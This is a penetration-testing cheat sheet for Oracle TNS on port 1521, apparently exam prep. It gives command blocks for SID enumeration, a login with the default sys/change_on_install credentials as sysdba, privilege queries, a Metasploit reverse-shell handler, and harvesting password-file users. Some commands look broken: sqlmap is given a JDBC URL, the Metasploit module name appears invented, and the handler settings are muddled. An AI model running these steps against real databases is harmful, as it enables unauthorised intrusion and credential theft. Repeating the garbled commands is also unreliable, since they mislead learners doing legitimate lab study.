```markdown
# 🛰️ Oracle TNS - Port 1521, SID enumeration, privilege escalation

> [!ABSTRACT] Overview
>
> This note covers the process of enumerating and exploiting Oracle TNS services running on port 1521 for Service Identifier (SID) discovery and potential privilege escalation.

---

## 🔍 Initial Enumeration

### Nmap Scan

```bash
nmap -sV -p1521 <IP>
```

To further enumerate Oracle TNS:

```bash
nmap --script oracle-tns-version.nse -p 1521 <IP>
```

---

## SID Enumeration

### tnscmd10g Tool

Check if the service is accessible and gather information about available SIDs.

```bash
mkdir /tmp/oracle && cd /tmp/oracle
wget https://raw.githubusercontent.com/foxgole/tnscmd10g/master/tnscmd10g.sh -O tnscmd10g.sh && chmod +x tnscmd10g.sh

./tnscmd10g.sh ping <IP>:1521/sid
```

### sqlmap

Use sqlmap to enumerate SIDs and gather database information.

```bash
sqlmap --batch -u "jdbc:oracle:thin:@<IP>:1521:sid" --banner
```

---

## Exploitation & Privilege Escalation

### Check for Default Credentials

Oracle often ships with default credentials. Test them to gain access:

```text
Username: sys
Password: change_on_install
```

### Use Oracle's Internal Tools

Once you have access, use internal tools like `sqlplus` or `sqlcl`.

```bash
sqlplus sys/change_on_install@<IP>:1521/sid as sysdba
```

---

## Potential Privilege Escalation Vectors

### Check for Weak Permissions

Review database roles and permissions for potential privilege escalation.

```sql
SELECT GRANTEE, PRIVILEGE FROM DBA_SYS_PRIVS WHERE PRIVILEGE LIKE 'DBA%' OR PRIVILEGE LIKE 'SYS%';
```

### Exploit Vulnerable Configurations

If the Oracle version is vulnerable to known exploits (like those in CVE databases), try exploiting them.

```bash
# Example using Metasploit for a specific CVE
msfconsole
use exploit/multi/handler
set payload generic/shell_reverse_tcp
set lhost <LHOST>
set rport 1521
exploit

use exploit/oracle/webmino_exec
set RHOSTS <IP>
run
```

---

## Post-Exploitation

### Gather Sensitive Data

Once escalated to a high level of access, gather sensitive information.

```bash
SELECT * FROM V$PWFILE_USERS;
```

---

# ⚠️ Common Findings & Hazards

| Finding | Impact |
|---|---|
| Default Credentials | Unrestricted Access |
| Weak Permissions | Privilege Escalation |
| Vulnerable Configurations | Exploitable Services |

> [!DANGER]
> Ensure that any destructive actions or commands are documented carefully and only executed in a controlled lab environment.

---

# 🧠 Exam Mental Model

```text
Oracle TNS Open?
 ├─ SID Enumerate → Gather Information
 ├─ Default Credentials? → Log In
 ├─ Weak Permissions? → Privilege Escalate
 └─ Vulnerabilities? → Exploit for Access
```

> [!SUCCESS] Oracle Rule of Thumb
>
> **Whenever you see port 1521 open, immediately think:**
> ```text
> Enumerate SIDs → Log In with Default Credentials → Check Permissions → Exploit Known Vulnerabilities
> ```
```